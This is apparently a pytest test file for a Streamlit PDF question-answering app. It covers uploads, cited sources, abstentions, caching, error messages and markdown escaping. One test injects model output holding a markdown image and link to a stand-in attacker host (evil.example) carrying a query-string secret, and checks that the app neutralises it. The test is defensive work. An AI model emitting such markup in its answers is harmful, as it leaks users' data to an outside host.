import re
import subprocess
import sys
from pathlib import Path

import pytest
import streamlit as st
from chat_stubs import FailingChatModel, model_replying, reply
from streamlit.testing.v1 import AppTest

from intelligent_document_assistant.app import documents, ui
from intelligent_document_assistant.generation import MissingCredentialsError

APP_FILE = Path(__file__).resolve().parents[1] / "src/intelligent_document_assistant/app/streamlit_app.py"
FOUNDING_QUESTION = "Who founded it, and what was the garage in Lisbon?"
DEFAULT_REPLY = reply(True, "It was founded in 1998 in a Lisbon garage.", [1])


class Harness:
    """Fakes for the expensive collaborators, plus counters for how often each is used."""

    def __init__(self, monkeypatch, embed_model):
        self.chat_model = model_replying(DEFAULT_REPLY)
        self.counts = {"embed_model": 0, "chat_model": 0, "index_build": 0, "answer": 0}
        self.chat_error: Exception | None = None

        def create_embed_model():
            self.counts["embed_model"] += 1
            return embed_model

        def create_chat_model():
            self.counts["chat_model"] += 1
            if self.chat_error:
                raise self.chat_error
            return self.chat_model

        real_build, real_answer = documents.build_document_index, ui.answer_question

        def build(*args, **kwargs):
            self.counts["index_build"] += 1
            return real_build(*args, **kwargs)

        def answer(*args, **kwargs):
            self.counts["answer"] += 1
            return real_answer(*args, **kwargs)

        monkeypatch.setattr(ui, "create_embed_model", create_embed_model)
        monkeypatch.setattr(ui, "create_chat_model", create_chat_model)
        monkeypatch.setattr(ui, "build_document_index", build)
        monkeypatch.setattr(ui, "answer_question", answer)

    def new_app(self) -> AppTest:
        return AppTest.from_file(str(APP_FILE), default_timeout=30).run()


@pytest.fixture
def harness(monkeypatch, keyword_embed_model):
    st.cache_resource.clear()
    yield Harness(monkeypatch, keyword_embed_model)
    st.cache_resource.clear()


@pytest.fixture
def app(harness):
    return harness.new_app()


def upload(app: AppTest, name: str, data: bytes) -> AppTest:
    uploader = app.file_uploader[0]
    uploader._files = None  # AppTest appends uploads; a browser replaces the selection
    return uploader.upload(name, data).run()


def ask(app: AppTest, question: str) -> AppTest:
    app.text_input[0].input(question)
    return app.button(key="ask").click().run()


LIVE_IMAGE_OR_LINK = re.compile(r"(?<!\\)!\[|(?<!\\)\]\(")  # markdown not preceded by a backslash


def rendered_text(app: AppTest) -> str:
    parts = [e.value for group in (app.markdown, app.error, app.warning, app.info, app.success) for e in group]
    parts += [e.label for e in app.expander] + [e.value for e in app.subheader]
    return "\n".join(str(p) for p in parts)


@pytest.fixture
def ready(app, company_pdf):
    """An app with altair.pdf uploaded and indexed."""
    return upload(app, "altair.pdf", company_pdf.read_bytes())


def test_importing_the_ui_loads_no_models():
    code = (
        "import sys, intelligent_document_assistant.app.ui; "
        "print([m for m in ('torch', 'sentence_transformers', 'langchain_groq') if m in sys.modules])"
    )
    result = subprocess.run([sys.executable, "-I", "-c", code], capture_output=True, text=True, check=True)

    assert result.stdout.strip() == "[]"


def test_without_a_document_the_app_invites_an_upload_and_loads_nothing(app, harness):
    assert not app.exception
    assert "Upload" in app.info[0].value
    assert len(app.text_input) == 0
    assert harness.counts == {"embed_model": 0, "chat_model": 0, "index_build": 0, "answer": 0}


def test_upload_builds_the_index_and_shows_the_original_file_name(app, harness, company_pdf):
    app = upload(app, "Annual Report (v2).pdf", company_pdf.read_bytes())

    assert not app.exception
    assert "Annual Report (v2).pdf" in app.success[0].value
    assert "4 pages" in app.success[0].value
    assert len(app.text_input) == 1
    assert harness.counts["index_build"] == 1


def test_answer_is_shown_with_its_cited_source_and_original_file_name(app, company_pdf):
    app = upload(app, "Annual Report (v2).pdf", company_pdf.read_bytes())

    app = ask(app, FOUNDING_QUESTION)

    assert "It was founded in 1998 in a Lisbon garage." in rendered_text(app)
    assert [s.value for s in app.subheader] == ["Answer", "Sources cited by the model"]
    cited = [e for e in app.expander if e.label == "Annual Report (v2).pdf — page 1"]
    assert len(cited) == 1
    assert "founded in 1998" in cited[0].text[0].value
    assert "upload.pdf" not in rendered_text(app)


def test_retrieved_passages_are_labelled_as_not_cited(ready):
    ready = ask(ready, FOUNDING_QUESTION)

    uncited = [e for e in ready.expander if "did not cite" in e.label]
    assert len(uncited) == 1
    assert "3" in uncited[0].label  # 4 retrieved, 1 cited


def test_answer_without_citations_does_not_present_retrieved_passages_as_cited(harness, ready):
    harness.chat_model.responses = [reply(True, "It was founded in 1998.", [])]

    ready = ask(ready, FOUNDING_QUESTION)

    assert "Sources cited by the model" not in [s.value for s in ready.subheader]
    assert any("did not cite any" in e.label for e in ready.expander)


def test_abstention_is_visibly_different_from_an_answer(harness, ready):
    harness.chat_model.responses = [reply(False, "The document does not say.", [])]

    ready = ask(ready, "What colour is the Heron robot?")

    assert "Not enough information in the document" in ready.warning[0].value
    assert "The document does not say." in ready.warning[0].value
    assert "Answer" not in [s.value for s in ready.subheader]
    assert "Sources cited by the model" not in [s.value for s in ready.subheader]
    assert any("Closest passages retrieved" in e.label for e in ready.expander)


def test_model_markup_cannot_embed_remote_images_or_links(harness, ready):
    harness.chat_model.responses = [reply(True, "![pixel](https://evil.example/?q=secret) [x](https://evil.example)", [])]

    ready = ask(ready, FOUNDING_QUESTION)

    shown = rendered_text(ready)
    assert not LIVE_IMAGE_OR_LINK.search(shown)
    assert "https://evil.example" in shown  # the text itself is still readable


def test_repeated_questions_reuse_the_index_and_models(harness, ready):
    ready = ask(ready, FOUNDING_QUESTION)
    ready = ask(ready, "Where is the headquarters in Rotterdam?")
    ready = ask(ready, "Which robot, the Heron?")

    assert harness.counts == {"embed_model": 1, "chat_model": 1, "index_build": 1, "answer": 3}


def test_ordinary_reruns_do_not_rebuild_anything(harness, ready):
    ready = ready.run().run()

    assert harness.counts["index_build"] == 1
    assert harness.counts["embed_model"] == 1


@pytest.mark.parametrize("question", ["", "   "])
def test_empty_question_is_rejected_without_calling_the_model(harness, ready, question):
    ready = ask(ready, question)

    assert "Enter a question" in ready.warning[0].value
    assert harness.counts["answer"] == 0
    assert harness.counts["chat_model"] == 0


def test_new_pdf_discards_the_previous_index_and_answer(harness, ready, make_pdf):
    ready = ask(ready, FOUNDING_QUESTION)
    assert ui.RESULT_KEY in ready.session_state and ready.session_state[ui.RESULT_KEY] is not None
    other = make_pdf(["Quarterly revenue grew in Singapore."], name="other.pdf")

    ready = upload(ready, "other.pdf", other.read_bytes())

    assert ready.session_state[ui.DOCUMENT_KEY].file_name == "other.pdf"
    assert ready.session_state[ui.RESULT_KEY] is None
    assert "It was founded in 1998" not in rendered_text(ready)
    assert harness.counts["index_build"] == 2
    assert harness.counts["embed_model"] == 1  # the embedding model is shared, not reloaded


def test_same_name_but_different_content_is_treated_as_a_new_document(harness, ready, make_pdf):
    changed = make_pdf(["Completely different content about turbines."], name="altair.pdf")

    ready = upload(ready, "altair.pdf", changed.read_bytes())

    assert harness.counts["index_build"] == 2
    assert "1 page" in ready.success[0].value


def test_start_over_clears_the_document_and_answer(ready):
    ready = ask(ready, FOUNDING_QUESTION)

    ready = ready.button(key="start_over").click().run()

    assert ready.session_state[ui.DOCUMENT_KEY] is None
    assert ready.session_state[ui.RESULT_KEY] is None
    assert "Upload" in ready.info[0].value
    assert ready.file_uploader[0].value is None


def test_sessions_do_not_share_documents_but_share_the_embedding_model(harness, company_pdf):
    first = harness.new_app()
    upload(first, "altair.pdf", company_pdf.read_bytes())

    second = harness.new_app()

    assert len(second.text_input) == 0
    assert ui.DOCUMENT_KEY not in second.session_state or second.session_state[ui.DOCUMENT_KEY] is None
    upload(second, "altair.pdf", company_pdf.read_bytes())
    assert harness.counts["embed_model"] == 1


@pytest.mark.parametrize(
    ("data", "expected"),
    [
        (b"this is not a pdf", "valid"),
        (b"", "valid"),
    ],
)
def test_unreadable_upload_shows_an_error_and_is_not_retried(harness, app, data, expected):
    app = upload(app, "report.pdf", data)

    assert expected in app.error[0].value
    assert "upload.pdf" not in app.error[0].value  # the internal temp name never reaches the user
    assert len(app.text_input) == 0
    app = app.run().run()
    assert harness.counts["index_build"] == 1  # reruns do not repeat the failed work


def test_scanned_pdf_error_explains_the_limitation(app, make_pdf):
    scanned = make_pdf([None], image_pages={0})

    app = upload(app, "scan.pdf", scanned.read_bytes())

    assert "scanned" in app.error[0].value
    assert not app.exception


def test_password_protected_pdf_error_is_specific(app, make_pdf):
    protected = make_pdf(["secret"], user_password="hunter2")

    app = upload(app, "locked.pdf", protected.read_bytes())

    assert "password" in app.error[0].value


def test_uploading_a_good_pdf_after_a_failed_one_recovers(app, company_pdf):
    app = upload(app, "bad.pdf", b"not a pdf")
    app = upload(app, "altair.pdf", company_pdf.read_bytes())

    assert not app.error
    assert "altair.pdf" in app.success[0].value


def test_provider_failure_is_an_error_not_an_answer_and_leaks_nothing(harness, ready):
    harness.chat_model = FailingChatModel(responses=["unused"])

    ready = ask(ready, FOUNDING_QUESTION)

    assert "request failed" in ready.error[0].value
    assert "sk-secret-123" not in rendered_text(ready)
    assert "Answer" not in [s.value for s in ready.subheader]
    assert not ready.warning  # an error is not displayed as an abstention


def test_malformed_model_output_is_reported(harness, ready):
    harness.chat_model.responses = ["definitely not json"]

    ready = ask(ready, FOUNDING_QUESTION)

    assert "expected format" in ready.error[0].value
    assert "Answer" not in [s.value for s in ready.subheader]


def test_missing_api_key_gives_setup_guidance(harness, ready):
    harness.chat_error = MissingCredentialsError("GROQ_API_KEY is not set. Add it to your environment or .env file.")

    ready = ask(ready, FOUNDING_QUESTION)

    assert "GROQ_API_KEY" in ready.error[0].value
    assert not ready.exception


def test_a_failed_question_clears_the_previous_answer(harness, ready):
    ready = ask(ready, FOUNDING_QUESTION)
    harness.chat_model.responses = ["definitely not json"]

    ready = ask(ready, "Where is the headquarters in Rotterdam?")

    assert ready.session_state[ui.RESULT_KEY] is None
    assert "It was founded in 1998" not in rendered_text(ready)


def test_escape_markdown_neutralises_links_images_and_formatting():
    escaped = ui.escape_markdown("![a](http://x) [b](http://y) **bold** `code` <b>")

    assert not LIVE_IMAGE_OR_LINK.search(escaped)
    assert not re.search(r"(?<!\\)[*`<>]", escaped)  # no unescaped emphasis, code or HTML
